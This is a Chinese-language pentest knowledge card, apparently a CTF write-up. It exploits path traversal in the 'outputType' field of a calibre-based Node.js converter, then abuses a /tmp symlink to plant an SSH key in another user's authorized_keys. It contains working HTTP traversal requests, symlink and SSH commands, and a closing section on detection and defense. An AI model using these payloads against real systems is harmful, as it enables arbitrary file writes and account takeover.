---
id: web-nodejs-calibre-outputtype-path-traversal-symlink-ssh-key
title: Calibre 转换器 outputType 文件名注入：../ 任意文件写 + 777/软链接绕过 fs.protected_symlinks 写 neil authorized_keys
type: scenario
domain: web
path: web/nodejs
technique: calibre-outputtype-path-traversal-symlink-authorized-keys
tags:
- web
- nodejs
- express
- calibre
- file-write
- path-traversal
- symlink
- ssh-key
- lateral-movement
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V304
  verified_at: '2026-11-08T11:43:42+08:00'
  notes: 已对照 content.md 与 img33-48 核对：3001 端口转发、destinationName=.、outputType=../../../../../../tmp/xianzhi.txt 写出 owner neil、写 ssh-rsa 到 /tmp/ssh.txt、ln -s /home/neil/.ssh/authorized_keys /tmp/ssh-backup.txt.txt 均与原文一致。未验证点：原文对 fs.protected_symlinks 的 777 文件+软链接顺序描述简略，卡片已注明需按规则调试；未实际完成 neil SSH 登录复现。
url: /docs/web/nodejs/web-nodejs-calibre-outputtype-path-traversal-symlink-ssh-key/
draft: false
kb_aliases:
- calibre ebook-convert 路径穿越
- outputType 文件名注入
- Bookworm Converter
- fs.protected_symlinks
- 写 authorized_keys
- neil 横向
---

## 一句话结论

内部 `127.0.0.1:3001` 的 Bookworm Converter 用 `destinationName = ${fileId}.${outputType}` 和 `path.resolve(path.join(__dirname,"output",destinationName))` 决定 calibre 的输出文件；提交 `outputType=../../../../../../tmp/xianzhi.txt` 即可让 `ebook-convert` 以 `neil` 身份把内容写到任意路径。再利用 `fs.protected_symlinks` 的规则（先在 `/tmp` 创建 777 文件、再放置指向 `/home/neil/.ssh/authorized_keys` 的软链接），让转换器把 SSH 公钥写进 neil 的 authorized_keys，从而 SSH 登录 neil。

## 原理

- **输出文件名可控**：`const destinationName = `${fileId}.${outputType}`; const destinationPath = path.resolve(path.join(__dirname, "output", destinationName));` 中 `outputType` 来自表单，未做 `basename`/扩展名白名单；`path.resolve` 会折叠 `..`，所以 `outputType` 中的 `../../..` 可跳出 `output` 目录。
- **calibre 的写入行为**：`ebook-convert input_file output_file` 按输出文件扩展名推断格式；它会创建输出文件/目录并写入转换结果。本题把上传内容（`testxianzhi`）作为输入，输出 `../../../../../../tmp/xianzhi.txt`，结果在 `/tmp/xianzhi.txt` 以 `neil` 身份写入（`ls -al` 显示 owner neil）。
- **横向目标**：转换器进程属于 neil；直接写 `/home/neil/.ssh/authorized_keys` 可能因文件已存在/权限/路径限制失败，且 `/home/neil/.ssh` 对 neil 可写但 frank 不能直接创建。
- **fs.protected_symlinks**：Linux 在 sticky 目录（如 `/tmp`）中默认 `fs.protected_symlinks=1`，只有当软链接所有者与跟随者相同（或目录所有者匹配）时才允许跟随，防止低权用户用软链接诱导高权进程写敏感文件。原文的绕过思路是先创建一个 777 文件，让转换器以 neil 身份打开/写入该路径，再将其替换为指向 neil `authorized_keys` 的软链接（或反之），从而让 neil 进程把公钥内容写进 authorized_keys；具体顺序/竞态原文描述较简略，卡片按“777 文件 + 软链接”记录，实际需按 `fs.protected_symlinks` 规则调试。
- **为什么能拿 shell**：authorized_keys 写入攻击者公钥后，攻击者用私钥 `ssh -i neil neil@bookworm.htb` 登录；neil 随后有 `sudo genlabel` 权限，继续提权 root（见关联卡）。

## 触发条件

- 能访问内部转换器（本例通过 `ssh -L 3001:127.0.0.1:3001` 端口转发，使用系统自带 ssh）。
- 转换器调用 calibre `ebook-convert`，输出文件名/扩展名由用户控制且未做路径校验。
- 进程以目标用户（neil）运行，且目标路径（`/tmp`、`~neil/.ssh`）可写；`fs.protected_symlinks` 规则允许/可绕过。
- 已有一个可上传的输入文件/内容（任意文本即可）。

## 利用步骤

1. 端口转发：`ssh frank@bookworm.htb -L 3001:127.0.0.1:3001`，访问 `http://127.0.0.1:3001/`。
2. 正常上传一个文本文件并转换，确认输出目录 `output/` 下有 `<uuid>.<outputType>` 文件。
3. 在 Burp 中把 `outputType` 改为 `../../../../../../tmp/xianzhi.txt`，上传内容随意；确认 `/tmp/xianzhi.txt` 被创建（owner neil）。
4. 生成短 RSA 密钥；按 `fs.protected_symlinks` 规则准备 777 文件与指向 `/home/neil/.ssh/authorized_keys` 的软链接（原文：先新建 777 文件，再创建写入文件/软链接）。
5. 再次提交转换，使 `ebook-convert` 把公钥内容写到目标路径（authorized_keys）。
6. `ssh -i neil_key neil@bookworm.htb` 验证登录。
7. 记录请求、`ls -al` 文件所有权、authorized_keys 内容与 SSH 登录。

## PoC

正常输出：

```http
POST /convert HTTP/1.1
Host: 127.0.0.1:3001
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="convertFile"; filename="test.txt"
Content-Type: application/pdf

testxianzhi
------x
Content-Disposition: form-data; name="outputType"

.epub
------x--
```

路径穿越写文件：

```http
POST /convert HTTP/1.1
Host: 127.0.0.1:3001
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="convertFile"; filename="xianzhi"
Content-Type: application/pdf

testxianzhi
------x
Content-Disposition: form-data; name="outputType"

../../../../../../tmp/xianzhi.txt
------x--
```

```bash
ls -al /tmp/xianzhi.txt   # -rw-r--r-- 1 neil neil 17 ...
```

软链接/公钥写入（原文思路）：

```bash
# 1) 准备 777 文件/软链接（按 fs.protected_symlinks 规则调整顺序）
ln -s /home/neil/.ssh/authorized_keys /tmp/ssh-backup.txt.txt
# 2) 让 outputType 指向该路径并提交包含 ssh-rsa 公钥的内容
#    outputType=../../../../../../tmp/ssh-backup.txt.txt
# 3) 以 neil 登录
ssh -i neil_key neil@bookworm.htb
```

## 变体与关联

- **直接写 authorized_keys**：若转换器进程对目标路径有写权限且文件不存在/可覆盖，可直接 `outputType=../../../../../../home/neil/.ssh/authorized_keys`（但需处理已存在文件与目录权限）。
- **其他输出路径**：`/tmp`、`/home/neil/.ssh/`、Web 根、cron 目录；任意写可升级为 cron/SSH/服务持久化。
- **其他转换器**：LibreOffice/ImageMagick/ffmpeg 等按扩展名/输出路径调用的服务也可能有同类问题。
- 关联：[[pentest-privilege-escalation-sudo-genlabel-sqli-postscript-authorized-keys]]（拿到 neil 后用 sudo genlabel 提 root）。

## 检测与防御

- **代码**：`outputType` 只允许固定枚举（如 `epub`/`pdf`/`mobi`），用 `path.basename` 并校验最终路径位于 `output` 目录内；不要用 `path.resolve` 拼接用户可控扩展名。
- **运行**：转换器以低权限专用用户运行，禁止写 `~/.ssh`、cron、Web 根；开启并正确配置 `fs.protected_symlinks`/`fs.protected_hardlinks`；输出目录与其他敏感目录隔离。
- **检测**：`outputType` 中出现 `../`、绝对路径、`.ssh`、`authorized_keys`、`/tmp`；转换器输出目录外出现新文件；`neil` 的 authorized_keys 被修改；异常 SSH 公钥登录。
